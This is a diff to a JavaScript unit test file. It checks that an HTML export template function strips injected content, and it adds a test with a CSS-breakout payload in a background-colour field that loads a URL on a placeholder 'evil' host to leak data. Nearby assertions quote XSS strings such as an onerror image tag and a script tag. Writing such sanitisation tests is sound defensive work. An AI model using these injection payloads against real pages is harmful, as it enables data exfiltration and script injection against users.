@@ -54,4 +54,21 @@ describe('generateExportHtmlTemplate', () => {
     expect(html).not.toContain('<img src=x onerror=alert(1)>');
     expect(html).not.toContain('<script>alert(3)</script>');
   });
+
+  it('neutralizes CSS-breakout payloads in rootBgColor injected into the style block', () => {
+    const html = generateExportHtmlTemplate({
+      title: 'safe',
+      date: '2026-04-26',
+      model: 'gemini-test',
+      contentHtml: '<div>content</div>',
+      styles: '',
+      themeId: 'onyx',
+      language: 'en',
+      rootBgColor: 'red;} body{background:url(https://evil/?leak)/*',
+      bodyClasses: 'antialiased',
+    });
+
+    expect(html).not.toContain('https://evil/?leak');
+    expect(html).not.toContain('red;}');
+  });
 });
